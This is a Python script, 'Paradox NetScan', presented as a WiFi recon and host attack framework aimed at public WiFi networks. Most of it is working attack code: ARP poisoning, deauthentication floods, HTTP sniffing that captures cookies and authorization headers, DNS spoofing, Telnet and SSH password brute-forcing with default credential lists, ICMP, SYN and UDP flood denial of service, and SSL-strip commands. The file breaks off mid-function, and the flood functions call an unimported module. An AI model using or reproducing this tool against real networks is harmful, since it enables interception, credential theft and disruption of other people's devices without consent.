#!/usr/bin/env python3
# paradox_netscan.py | Python 3.11+ | Linux / Termux
# Paradox NetScan v1.0 — WiFi attach, host discovery, target selection, attack menu
#
# deps: scapy, netifaces, rich
# pip install scapy netifaces rich
# Termux: pkg install nmap python && pip install scapy netifaces rich
# MUST run as root: sudo python paradox_netscan.py
# Termux: termux-setup-storage, then run as root via tsu or sudo

from __future__ import annotations

import os
import sys
import subprocess
import socket
import struct
import time
import threading
import ipaddress
from dataclasses import dataclass, field
from typing import Optional

# ── rich UI ──────────────────────────────────────────────────────────────────
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box

console = Console()

BANNER = r"""
[bold red]
  ███╗   ██╗███████╗████████╗███████╗ ██████╗ █████╗ ███╗   ██╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔════╝██╔══██╗████╗  ██║
  ██╔██╗ ██║█████╗     ██║   ███████╗██║     ███████║██╔██╗ ██║
  ██║╚██╗██║██╔══╝     ██║   ╚════██║██║     ██╔══██║██║╚██╗██║
  ██║ ╚████║███████╗   ██║   ███████║╚██████╗██║  ██║██║ ╚████║
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
[/bold red]
[bold yellow]  PARADOX NETSCAN v1.0  |  WiFi Recon + Host Attack Framework[/bold yellow]
[dim]  public wifi · host discovery · arp scan · attack menu[/dim]
"""

# ─── ROOT CHECK ──────────────────────────────────────────────────────────────

def require_root() -> None:
    if os.geteuid() != 0:
        console.print("[bold red][!] Must run as root. Use: sudo python paradox_netscan.py[/bold red]")
        sys.exit(1)

# ─── DATA MODELS ─────────────────────────────────────────────────────────────

@dataclass
class WiFiNetwork:
    ssid:    str
    bssid:   str
    signal:  int     # dBm
    channel: int
    security: str

@dataclass
class Host:
    ip:       str
    mac:      str = "unknown"
    hostname: str = "unknown"
    vendor:   str = "unknown"
    open_ports: list[int] = field(default_factory=list)
    os_guess:   str = "unknown"

# ─── WIFI SCANNER ────────────────────────────────────────────────────────────

def scan_wifi_networks() -> list[WiFiNetwork]:
    """
    Uses nmcli (Linux) or iwlist (fallback) to list nearby APs.
    Termux: uses termux-wifi-scaninfo if available.
    """
    networks: list[WiFiNetwork] = []

    # Try nmcli first (most Linux distros)
    try:
        out = subprocess.check_output(
            ["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY", "dev", "wifi", "list"],
            stderr=subprocess.DEVNULL,
            text=True,
        )
        for line in out.strip().splitlines():
            parts = line.split(":")
            if len(parts) >= 5:
                try:
                    networks.append(WiFiNetwork(
                        ssid=parts[0] or "<hidden>",
                        bssid=":".join(parts[1:7]) if len(parts) > 6 else parts[1],
                        signal=int(parts[-3]) if parts[-3].lstrip("-").isdigit() else 0,
                        channel=int(parts[-2]) if parts[-2].isdigit() else 0,
                        security=parts[-1] or "OPEN",
                    ))
                except (ValueError, IndexError):
                    continue
        if networks:
            return networks
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass

    # Fallback: iwlist
    try:
        iface = get_default_iface()
        out = subprocess.check_output(
            ["iwlist", iface, "scan"],
            stderr=subprocess.DEVNULL,
            text=True,
        )
        current: dict = {}
        for line in out.splitlines():
            line = line.strip()
            if "ESSID:" in line:
                current["ssid"] = line.split('"')[1] if '"' in line else "<hidden>"
            elif "Address:" in line:
                current["bssid"] = line.split("Address:")[1].strip()
            elif "Signal level=" in line:
                try:
                    sig = line.split("Signal level=")[1].split(" ")[0]
                    current["signal"] = int(sig.split("/")[0]) if "/" in sig else int(sig)
                except ValueError:
                    current["signal"] = 0
            elif "Channel:" in line:
                try:
                    current["channel"] = int(line.split("Channel:")[1].strip())
                except ValueError:
                    current["channel"] = 0
            elif "Encryption key:" in line:
                current["security"] = "WPA" if "on" in line else "OPEN"
            elif "Cell" in line and "bssid" in current:
                if "ssid" in current:
                    networks.append(WiFiNetwork(
                        ssid=current.get("ssid", "<hidden>"),
                        bssid=current.get("bssid", ""),
                        signal=current.get("signal", 0),
                        channel=current.get("channel", 0),
                        security=current.get("security", "OPEN"),
                    ))
                current = {}
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass

    return networks


def get_default_iface() -> str:
    """Return the first wireless interface found."""
    try:
        out = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT, text=True)
        for line in out.splitlines():
            if "IEEE 802.11" in line or "ESSID" in line:
                return line.split()[0]
    except FileNotFoundError:
        pass
    # Fallback: ip link
    try:
        out = subprocess.check_output(["ip", "link"], text=True)
        for line in out.splitlines():
            if "wlan" in line or "wlp" in line or "wlx" in line:
                return line.split(":")[1].strip()
    except Exception:
        pass
    return "wlan0"


def connect_to_network(ssid: str, password: str = "") -> bool:
    """
    Attempts to connect via nmcli.
    Open networks: password = ""
    """
    console.print(f"[yellow][*] Connecting to {ssid}...[/yellow]")
    try:
        if password:
            cmd = ["nmcli", "dev", "wifi", "connect", ssid, "password", password]
        else:
            cmd = ["nmcli", "dev", "wifi", "connect", ssid]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        if "successfully" in result.stdout.lower() or result.returncode == 0:
            console.print(f"[green][+] Connected to {ssid}[/green]")
            return True
        else:
            console.print(f"[red][-] Failed: {result.stderr.strip()}[/red]")
            return False
    except subprocess.TimeoutExpired:
        console.print("[red][-] Connection timed out.[/red]")
        return False


# ─── NETWORK UTILS ───────────────────────────────────────────────────────────

def get_local_cidr() -> str:
    """Return local subnet in CIDR notation, e.g. 192.168.1.0/24."""
    try:
        import netifaces
        iface = get_default_iface()
        addrs = netifaces.ifaddresses(iface)
        ipv4  = addrs.get(netifaces.AF_INET, [{}])[0]
        ip    = ipv4.get("addr", "")
        mask  = ipv4.get("netmask", "255.255.255.0")
        if ip:
            net = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
            return str(net)
    except Exception:
        pass
    # Fallback
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return f"{local_ip.rsplit('.', 1)[0]}.0/24"
    except Exception:
        return "192.168.1.0/24"


def get_mac_vendor(mac: str) -> str:
    """OUI lookup — first 3 octets against a small hardcoded table."""
    OUI: dict[str, str] = {
        "00:50:56": "VMware",        "00:0c:29": "VMware",
        "b8:27:eb": "Raspberry Pi",  "dc:a6:32": "Raspberry Pi",
        "e4:5f:01": "Raspberry Pi",  "00:1a:11": "Google",
        "94:65:2d": "Apple",         "f0:b4:29": "Apple",
        "3c:22:fb": "Apple",         "78:4f:43": "Apple",
        "00:1b:63": "Apple",         "00:50:f2": "Microsoft",
        "28:d2:44": "Samsung",       "8c:77:12": "Samsung",
        "00:16:3e": "Xen/AWS",       "52:54:00": "QEMU/KVM",
        "00:1c:bf": "Intel",         "10:02:b5": "Intel",
        "00:23:14": "Intel",         "18:60:24": "Huawei",
        "54:89:98": "Huawei",        "00:e0:4c": "Realtek",
        "d8:49:2f": "Xiaomi",        "f8:a2:d6": "Xiaomi",
        "b0:e2:35": "OnePlus",       "00:1f:33": "Nokia",
        "00:17:c8": "LG",            "00:26:37": "LG",
    }
    prefix = mac[:8].lower().replace("-", ":") if mac else ""
    return OUI.get(prefix, "Unknown")


# ─── ARP SCAN ────────────────────────────────────────────────────────────────

def arp_scan(cidr: str) -> list[Host]:
    """
    Sends ARP who-has to every IP in the subnet.
    Returns list of live Host objects with IP + MAC.
    Uses scapy — most reliable, works on Termux with root.
    """
    hosts: list[Host] = []
    console.print(f"[yellow][*] ARP scanning {cidr}...[/yellow]")
    try:
        from scapy.all import ARP, Ether, srp  # type: ignore
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr)
        answered, _ = srp(pkt, timeout=3, verbose=False)
        for _, rcv in answered:
            mac    = rcv.hwsrc
            ip     = rcv.psrc
            vendor = get_mac_vendor(mac)
            hosts.append(Host(ip=ip, mac=mac, vendor=vendor))
    except ImportError:
        console.print("[red][!] scapy not installed. pip install scapy[/red]")
    except Exception as e:
        console.print(f"[red][!] ARP scan error: {e}[/red]")
    return hosts


def resolve_hostname(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "unknown"


def port_scan(host: Host, ports: list[int] | None = None) -> None:
    """
    TCP connect scan on common ports.
    Default: top 20 most useful ports.
    """
    if ports is None:
        ports = [21, 22, 23, 25, 53, 80, 110, 139, 143,
                 443, 445, 3306, 3389, 5900, 8080, 8443,
                 8888, 9000, 27017, 1433]
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((host.ip, port)) == 0:
                open_ports.append(port)
            s.close()
        except Exception:
            pass
    host.open_ports = open_ports


PORT_SERVICES: dict[int, str] = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
    53: "DNS", 80: "HTTP", 110: "POP3", 139: "NetBIOS",
    143: "IMAP", 443: "HTTPS", 445: "SMB", 3306: "MySQL",
    3389: "RDP", 5900: "VNC", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
    8888: "Jupyter", 9000: "PHP-FPM", 27017: "MongoDB", 1433: "MSSQL",
}

# ─── ATTACK MENU ─────────────────────────────────────────────────────────────

def attack_menu(target: Host, iface: str) -> None:
    """
    Prints every possible action against the target host,
    executes the chosen one.
    """
    while True:
        console.print()
        console.print(Panel(
            f"[bold cyan]Target:[/bold cyan] {target.ip}  "
            f"[dim]MAC:[/dim] {target.mac}  "
            f"[dim]Vendor:[/dim] {target.vendor}  "
            f"[dim]Host:[/dim] {target.hostname}\n"
            f"[dim]Open ports:[/dim] {', '.join(str(p) for p in target.open_ports) or 'none scanned yet'}",
            title="[bold red]⚡ ATTACK MENU[/bold red]",
            border_style="red",
        ))

        table = Table(box=box.SIMPLE_HEAVY, expand=True)
        table.add_column("#",    style="bold red",  no_wrap=True)
        table.add_column("Attack", style="cyan")
        table.add_column("What it does", style="dim")

        attacks = [
            # (label, description)
            ("ARP Poison (MITM)",
             "Poison target's ARP cache → route all their traffic through you"),
            ("Deauth / Kick off WiFi",
             "Send 802.11 deauth frames → boot target off the network"),
            ("Port Scan (deep)",
             "TCP connect scan top 1000 ports → map every open service"),
            ("OS Fingerprint",
             "TTL + TCP window analysis → guess target OS"),
            ("HTTP Intercept (MITM active)",
             "After ARP poison, dump all plaintext HTTP traffic live"),
            ("DNS Spoof",
             "After ARP poison, redirect target's DNS queries to your IP"),
            ("SMB Probe",
             "Check port 445 for open shares, attempt null-session enum"),
            ("Telnet Brute (port 23)",
             "Try common cred list against open Telnet service"),
            ("SSH Brute (port 22)",
             "Hydra-style async brute against SSH with wordlist"),
            ("FTP Anon Check (port 21)",
             "Test anonymous FTP login — common on IoT / NAS devices"),
            ("VNC No-Auth Check (port 5900)",
             "Probe VNC for no-authentication or weak auth"),
            ("RDP Probe (port 3389)",
             "Confirm RDP is live, attempt NLA check"),
            ("Ping Flood (DoS)",
             "ICMP flood → saturate target's CPU/NIC — LAN only"),
            ("TCP SYN Flood (DoS)",
             "Half-open SYN storm → exhaust target's connection table"),
            ("UDP Flood (DoS)",
             "UDP packet storm to open/random ports → bandwidth DoS"),
            ("ARP Poison + SSL Strip",
             "MITM + downgrade HTTPS→HTTP to capture login creds"),
            ("Capture All Traffic (passive sniff)",
             "tcpdump on iface — log all packets to pcap for offline analysis"),
            ("mDNS/Bonjour Enum",
             "Discover services target advertises on local mDNS (_http, _ssh, etc.)"),
            ("NetBIOS Name Query",
             "NBT-NS probe → reveal Windows machine name and workgroup"),
            ("Back to host list", ""),
        ]

        for i, (name, desc) in enumerate(attacks, 1):
            table.add_row(str(i), name, desc)

        console.print(table)
        choice_raw = Prompt.ask("[bold red]Pick attack #[/bold red]", default="20")

        try:
            choice = int(choice_raw)
        except ValueError:
            continue

        if choice == 20:
            break

        # ── Dispatch ─────────────────────────────────────────────────────────

        if choice == 1:
            arp_poison(target.ip, iface)

        elif choice == 2:
            deauth(target.mac, iface)

        elif choice == 3:
            console.print("[yellow][*] Deep port scan — may take 30–60s...[/yellow]")
            deep_ports = list(range(1, 1025))
            port_scan(target, deep_ports)
            t = Table(box=box.SIMPLE)
            t.add_column("Port"); t.add_column("Service")
            for p in target.open_ports:
                t.add_row(str(p), PORT_SERVICES.get(p, "unknown"))
            console.print(t)

        elif choice == 4:
            os_fingerprint(target.ip)

        elif choice == 5:
            http_intercept(target.ip, iface)

        elif choice == 6:
            dns_spoof(target.ip, iface)

        elif choice == 7:
            smb_probe(target.ip)

        elif choice == 8:
            telnet_brute(target.ip)

        elif choice == 9:
            ssh_brute(target.ip)

        elif choice == 10:
            ftp_anon(target.ip)

        elif choice == 11:
            vnc_check(target.ip)

        elif choice == 12:
            rdp_probe(target.ip)

        elif choice == 13:
            ping_flood(target.ip, iface)

        elif choice == 14:
            syn_flood(target.ip, iface)

        elif choice == 15:
            udp_flood(target.ip, iface)

        elif choice == 16:
            arp_poison(target.ip, iface)
            ssl_strip_note()

        elif choice == 17:
            passive_sniff(iface)

        elif choice == 18:
            mdns_enum(target.ip)

        elif choice == 19:
            netbios_query(target.ip)


# ─── ATTACK IMPLEMENTATIONS ──────────────────────────────────────────────────

def arp_poison(target_ip: str, iface: str) -> None:
    """
    Classic ARP cache poison — tell target we're the gateway,
    tell gateway we're the target. Runs in background thread.
    Ctrl+C to stop and restore.
    """
    console.print("[yellow][*] ARP poisoning — finding gateway...[/yellow]")
    try:
        from scapy.all import ARP, Ether, sendp, get_if_hwaddr, srp  # type: ignore

        # Discover gateway
        gw_ip = subprocess.check_output(
            ["ip", "route", "show", "default"], text=True
        ).split()[2]

        # Resolve gateway MAC via ARP
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip)
        answered, _ = srp(pkt, timeout=3, verbose=False, iface=iface)
        if not answered:
            console.print("[red][-] Could not resolve gateway MAC.[/red]")
            return
        gw_mac = answered[0][1].hwsrc

        # Resolve target MAC
        pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
        answered2, _ = srp(pkt2, timeout=3, verbose=False, iface=iface)
        if not answered2:
            console.print("[red][-] Could not resolve target MAC.[/red]")
            return
        target_mac = answered2[0][1].hwsrc
        my_mac     = get_if_hwaddr(iface)

        console.print(f"[green][+] Poisoning: target={target_ip} ({target_mac}) gw={gw_ip} ({gw_mac})[/green]")
        console.print("[dim]   Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward[/dim]")
        subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"], capture_output=True)

        poison_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip)
        poison_gw     = ARP(op=2, pdst=gw_ip,     hwdst=gw_mac,     psrc=target_ip)

        console.print("[bold red][!] Poisoning active — Ctrl+C to stop and restore[/bold red]")
        try:
            count = 0
            while True:
                sendp(Ether(dst=target_mac) / poison_target, iface=iface, verbose=False)
                sendp(Ether(dst=gw_mac)     / poison_gw,     iface=iface, verbose=False)
                count += 2
                console.print(f"\r[green]   Packets sent: {count}[/green]", end="")
                time.sleep(1.5)
        except KeyboardInterrupt:
            console.print("\n[yellow][*] Restoring ARP tables...[/yellow]")
            # Restore with correct MACs
            restore_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip,     hwsrc=gw_mac)
            restore_gw     = ARP(op=2, pdst=gw_ip,     hwdst=gw_mac,     psrc=target_ip, hwsrc=target_mac)
            for _ in range(5):
                sendp(Ether(dst=target_mac) / restore_target, iface=iface, verbose=False)
                sendp(Ether(dst=gw_mac)     / restore_gw,     iface=iface, verbose=False)
            console.print("[green][+] ARP tables restored.[/green]")

    except ImportError:
        console.print("[red][!] scapy required: pip install scapy[/red]")
    except Exception as e:
        console.print(f"[red][!] ARP poison error: {e}[/red]")


def deauth(target_mac: str, iface: str) -> None:
    """
    802.11 deauthentication flood.
    Requires monitor mode: iwconfig <iface> mode monitor
    """
    console.print(f"[yellow][*] Deauth flood → {target_mac}[/yellow]")
    console.print(f"[dim]   Set monitor mode first: iwconfig {iface} mode monitor[/dim]")
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp  # type: ignore
        pkt = (
            RadioTap()
            / Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff")
            / Dot11Deauth(reason=7)
        )
        console.print("[bold red][!] Sending deauth frames — Ctrl+C to stop[/bold red]")
        count = 0
        try:
            while True:
                sendp(pkt, iface=iface, verbose=False, count=64)
                count += 64
                console.print(f"\r[red]   Deauth frames: {count}[/red]", end="")
        except KeyboardInterrupt:
            console.print(f"\n[yellow][*] Stopped. Total sent: {count}[/yellow]")
    except ImportError:
        console.print("[red][!] scapy required[/red]")


def os_fingerprint(ip: str) -> None:
    """
    Passive OS guess via ICMP TTL + TCP window size.
    TTL 64 → Linux/Android. TTL 128 → Windows. TTL 255 → Cisco/iOS.
    """
    console.print(f"[yellow][*] OS fingerprinting {ip}...[/yellow]")
    try:
        from scapy.all import IP, ICMP, TCP, sr1  # type: ignore
        # ICMP ping TTL
        pkt  = IP(dst=ip) / ICMP()
        resp = sr1(pkt, timeout=3, verbose=False)
        ttl  = resp.ttl if resp else None

        # TCP SYN to 80 for window size
        syn  = IP(dst=ip) / TCP(dport=80, flags="S")
        synr = sr1(syn, timeout=3, verbose=False)
        win  = synr[TCP].window if synr and TCP in synr else None

        if ttl is None:
            console.print("[red][-] No ICMP response.[/red]")
            return

        if ttl <= 64:
            os_guess = "Linux / Android / macOS"
        elif ttl <= 128:
            os_guess = "Windows (NT/10/11)"
        elif ttl <= 255:
            os_guess = "Cisco IOS / FreeBSD / Solaris"
        else:
            os_guess = "Unknown"

        console.print(f"[green]   TTL: {ttl}  TCP Window: {win}  → [bold]{os_guess}[/bold][/green]")

    except ImportError:
        console.print("[red][!] scapy required[/red]")


def http_intercept(target_ip: str, iface: str) -> None:
    """
    Passive HTTP sniffer — after ARP poison is running,
    dumps Host + GET/POST lines from target's plaintext HTTP.
    """
    console.print(f"[yellow][*] HTTP intercept on {iface} filtering {target_ip} — Ctrl+C to stop[/yellow]")
    console.print("[dim]   Run ARP poison first (option 1) in another terminal[/dim]")
    try:
        from scapy.all import sniff, TCP, IP, Raw  # type: ignore

        def parse(pkt) -> None:
            if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
                if pkt[IP].src == target_ip or pkt[IP].dst == target_ip:
                    raw = pkt[Raw].load.decode("utf-8", errors="ignore")
                    if any(m in raw for m in ("GET ", "POST ", "Host:", "Cookie:", "Authorization:")):
                        for line in raw.splitlines():
                            if any(k in line for k in ("GET ", "POST ", "Host:", "Cookie:", "Authorization:")):
                                console.print(f"[cyan]   {line.strip()}[/cyan]")

        sniff(iface=iface, prn=parse, filter=f"tcp port 80 and host {target_ip}", store=False)
    except ImportError:
        console.print("[red][!] scapy required[/red]")
    except KeyboardInterrupt:
        console.print("\n[yellow][*] Intercept stopped.[/yellow]")


def dns_spoof(target_ip: str, iface: str) -> None:
    """
    DNS spoof — intercept DNS queries from target, reply with attacker IP.
    Requires ARP poison active so target's traffic flows through us.
    """
    console.print("[yellow][*] DNS Spoof active — Ctrl+C to stop[/yellow]")
    spoof_ip = Prompt.ask("IP to redirect ALL target DNS queries to", default="192.168.1.100")
    try:
        from scapy.all import sniff, IP, UDP, DNS, DNSRR, DNSQR, send  # type: ignore

        def spoof_pkt(pkt) -> None:
            if (
                pkt.haslayer(DNSQR)
                and pkt[IP].src == target_ip
                and pkt[UDP].dport == 53
            ):
                qname = pkt[DNSQR].qname.decode()
                spoofed = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst)
                    / UDP(dport=pkt[UDP].sport, sport=53)
                    / DNS(
                        id=pkt[DNS].id,
                        qr=1, aa=1, qd=pkt[DNS].qd,
                        an=DNSRR(rrname=qname, ttl=10, rdata=spoof_ip),
                    )
                )
                send(spoofed, verbose=False, iface=iface)
                console.print(f"[red]   Spoofed: {qname} → {spoof_ip}[/red]")

        sniff(iface=iface, prn=spoof_pkt, filter="udp port 53", store=False)
    except ImportError:
        console.print("[red][!] scapy required[/red]")
    except KeyboardInterrupt:
        console.print("\n[yellow][*] DNS spoof stopped.[/yellow]")


def smb_probe(ip: str) -> None:
    """Null session SMB enum via smbclient if available, else raw socket check."""
    console.print(f"[yellow][*] SMB probe on {ip}:445...[/yellow]")
    s = socket.socket()
    s.settimeout(3)
    if s.connect_ex((ip, 445)) != 0:
        console.print("[red][-] Port 445 closed.[/red]")
        s.close()
        return
    s.close()
    console.print(f"[green][+] Port 445 open.[/green]")
    try:
        out = subprocess.check_output(
            ["smbclient", "-L", ip, "-N"],
            stderr=subprocess.STDOUT, text=True, timeout=10,
        )
        console.print(f"[cyan]{out}[/cyan]")
    except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
        console.print(f"[dim]   smbclient output: {e}[/dim]")


def telnet_brute(ip: str) -> None:
    """Async TCP brute against Telnet port 23."""
    import itertools
    USERS  = ["admin", "root", "user", "support", "guest"]
    PASSES = ["admin", "root", "1234", "12345", "password", "admin123",
              "support", "", "0000", "toor", "pass", "123456"]
    console.print(f"[yellow][*] Telnet brute {ip}:23...[/yellow]")
    for user, passwd in itertools.product(USERS, PASSES):
        try:
            import telnetlib  # stdlib — available Python 3.11 and below
            tn = telnetlib.Telnet(ip, 23, timeout=3)
            tn.read_until(b"login:", timeout=3)
            tn.write(user.encode() + b"\n")
            tn.read_until(b"Password:", timeout=3)
            tn.write(passwd.encode() + b"\n")
            time.sleep(0.5)
            banner = tn.read_very_eager().decode("utf-8", errors="ignore")
            tn.close()
            if "$" in banner or "#" in banner or ">" in banner:
                console.print(f"[bold green][+] TELNET CREDS: {user}:{passwd}[/bold green]")
                return
        except Exception:
            pass
        console.print(f"\r[dim]   Trying {user}:{passwd}[/dim]", end="")
    console.print("\n[red][-] Telnet brute exhausted.[/red]")


def ssh_brute(ip: str) -> None:
    """SSH brute via paramiko if installed, else prints install note."""
    USERS  = ["root", "admin", "ubuntu", "pi", "user"]
    PASSES = ["root", "admin", "raspberry", "toor", "password",
              "admin123", "1234", "12345", "pass", ""]
    console.print(f"[yellow][*] SSH brute {ip}:22... (pip install paramiko if missing)[/yellow]")
    try:
        import paramiko  # type: ignore
    except ImportError:
        console.print("[red][!] pip install paramiko[/red]")
        return

    import itertools
    for user, passwd in itertools.product(USERS, PASSES):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=22, username=user, password=passwd, timeout=3, banner_timeout=5)
            console.print(f"\n[bold green][+] SSH CREDS: {user}:{passwd}[/bold green]")
            client.close()
            return
        except paramiko.AuthenticationException:
            pass
        except Exception:
            pass
        console.print(f"\r[dim]   Trying {user}:{passwd}[/dim]", end="")
    console.print("\n[red][-] SSH brute exhausted.[/red]")


def ftp_anon(ip: str) -> None:
    """Test anonymous FTP login."""
    import ftplib
    console.print(f"[yellow][*] FTP anonymous check {ip}:21...[/yellow]")
    try:
        ftp = ftplib.FTP(timeout=5)
        ftp.connect(ip, 21)
        ftp.login("anonymous", "anonymous@example.com")
        listing = ftp.nlst()
        console.print(f"[bold green][+] Anonymous FTP open! Files: {listing[:10]}[/bold green]")
        ftp.quit()
    except ftplib.error_perm:
        console.print("[red][-] Anonymous login rejected.[/red]")
    except Exception as e:
        console.print(f"[red][-] FTP error: {e}[/red]")


def vnc_check(ip: str) -> None:
    """Probe VNC for no-auth or weak handshake."""
    console.print(f"[yellow][*] VNC probe {ip}:5900...[/yellow]")
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((ip, 5900))
        banner = s.recv(12).decode("utf-8", errors="ignore")
        console.print(f"[cyan]   Banner: {banner.strip()}[/cyan]")
        # Security type negotiation
        sec_types = s.recv(2)
        if len(sec_types) >= 2 and sec_types[1] == 1:
            console.print("[bold green][+] VNC No-Auth (security type 1) — open access![/bold green]")
        else:
            console.print(f"[dim]   Security types byte: {sec_types.hex()}[/dim]")
        s.close()
    except Exception as e:
        console.print(f"[red][-] VNC probe: {e}[/red]")


def rdp_probe(ip: str) -> None:
    """Check RDP port and attempt NTLM/NLA banner grab."""
    console.print(f"[yellow][*] RDP probe {ip}:3389...[/yellow]")
    s = socket.socket()
    s.settimeout(5)
    if s.connect_ex((ip, 3389)) != 0:
        console.print("[red][-] RDP port closed.[/red]")
        s.close()
        return
    # TPKT + X.224 Connection Request
    pkt = bytes.fromhex(
        "030000130ee00000000000000100080003000000"
    )
    s.send(pkt)
    resp = s.recv(1024)
    s.close()
    console.print(f"[green][+] RDP alive. Response hex: {resp[:32].hex()}[/green]")
    if b"RDP" in resp or len(resp) > 10:
        console.print("[cyan]   RDP endpoint confirmed — try Hydra or xfreerdp for brute.[/cyan]")


def ping_flood(ip: str, iface: str) -> None:
    """ICMP flood — LAN only, saturates NIC/CPU."""
    console.print(f"[bold red][!] ICMP flood → {ip} — Ctrl+C to stop[/bold red]")
    try:
        from scapy.all import IP, ICMP, sendp, Ether  # type: ignore
        pkt   = Ether() / IP(dst=ip) / ICMP() / (b"X" * 1400)
        count = 0
        try:
            while True:
                sendp(pkt, iface=iface, verbose=False, count=100)
                count += 100
                console.print(f"\r[red]   Packets: {count}[/red]", end="")
        except KeyboardInterrupt:
            console.print(f"\n[yellow][*] Stopped. Total: {count}[/yellow]")
    except ImportError:
        console.print("[red][!] scapy required[/red]")


def syn_flood(ip: str, iface: str) -> None:
    """TCP SYN flood — half-open connection exhaustion."""
    console.print(f"[bold red][!] SYN flood → {ip} — Ctrl+C to stop[/bold red]")
    try:
        from scapy.all import IP, TCP, sendp, Ether, RandShort  # type: ignore
        count = 0
        try:
            while True:
                pkt = IP(dst=ip, src=f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}") \
                      / TCP(sport=RandShort(), dport=random.choice([80, 443, 8080]), flags="S", seq=random.randint(0, 2**32))
                sendp(Ether() / pkt, iface=iface, verbose=False, count=50)
                count += 50
                console.print(f"\r[red]   SYN packets: {count}[/red]", end="")
        except KeyboardInterrupt:
            console.print(f"\n[yellow][*] Stopped. Total: {count}[/yellow]")
    except ImportError:
        console.print("[red][!] scapy required[/red]")


def udp_flood(ip: str, iface: str) -> None:
    """UDP flood to random high ports."""
    console.print(f"[bold red][!] UDP flood → {ip} — Ctrl+C to stop[/bold red]")
    try:
        from scapy.all import IP, UDP, Raw, sendp, Ether  # type: ignore
        count = 0
        try:
            while True:
                pkt = Ether() / IP(dst=ip) / UDP(dport=random.randint(1024, 65535)) / Raw(load=os.urandom(1024))
                sendp(pkt, iface=iface, verbose=False, count=50)
                count += 50
                console.print(f"\r[red]   UDP packets: {count}[/red]", end="")
        except KeyboardInterrupt:
            console.print(f"\n[yellow][*] Stopped. Total: {count}[/yellow]")
    except ImportError:
        console.print("[red][!] scapy required[/red]")


def ssl_strip_note() -> None:
    console.print("[cyan]   SSL Strip: ARP poison running. Now run:[/cyan]")
    console.print("[dim]   pip install mitmproxy[/dim]")
    console.print("[dim]   mitmproxy --mode transparent --ssl-insecure -p 8080[/dim]")
    console.print("[dim]   iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080[/dim]")


def passive_sniff(iface: str) -> None:
    """Dump all packets to pcap — Ctrl+C stops, opens in Wireshark."""
    fname = f"paradox_capture_{int(time.time())}.pcap"
    console.print(f"[yellow][*] Sniffing on {iface} → {fname} — Ctrl+C to stop[/yellow]")
    try:
        from scapy.all import sniff, wrpcap  # type: ignore
        packets = []
        try:
            def add(pkt): packets.append(pkt)
            sniff(iface=iface, prn=add, store=False)
        except KeyboardInterrupt:
            pass
        wrpcap(fname, packets)
        console.print(f"[green][+] Saved {len(packets)} packets → {fname}[/green]")
        console.print(f"[dim]   Open with: wireshark {fname}[/dim]")
    except ImportError:
        console.print("[red][!] scapy required[/red]")


def mdns_enum(ip: str) -> None:
    """Send mDNS PTR query and listen for service announcements."""
    console.print(f"[yellow][*] mDNS enum (listening 5s)...[/yellow]")
    try:
        from scapy.all import sniff, DNS, DNSQR, IP, UDP, send  # type: ignore
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(5)
        sock.sendto(b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                    b"\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c\x00\x01",
                    ("224.0.0.251", 5353))
        seen = set()
        try:
            while True:
                data, addr = sock.recvfrom(4096)
                if addr[0] not in seen:
                    seen.add(addr[0])
                    console.print(f"[cyan]   mDNS from {addr[0]}: {len(data)} bytes[/cyan]")
        except socket.timeout:
            pass
        sock.close()
        if not seen:
            console.print("[dim]   No mDNS responses.[/dim]")
    except Exception as e:
        console.print(f"[dim]   mDNS: {e}[/dim]")


def netbios_query(ip: str) -> None:
    """NBT-NS name query → Windows machine name."""
    console.print(f"[yellow][*] NetBIOS query → {ip}...[/yellow]")
    try:
        # NBNS status request
        query = (
            b"\xff\xfe\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            b"\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00"
            b"\x00\x21\x00\x01"
        )
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.sendto(query, (ip, 137))
        resp, _ = s.recvfrom(1024)
        s.close()
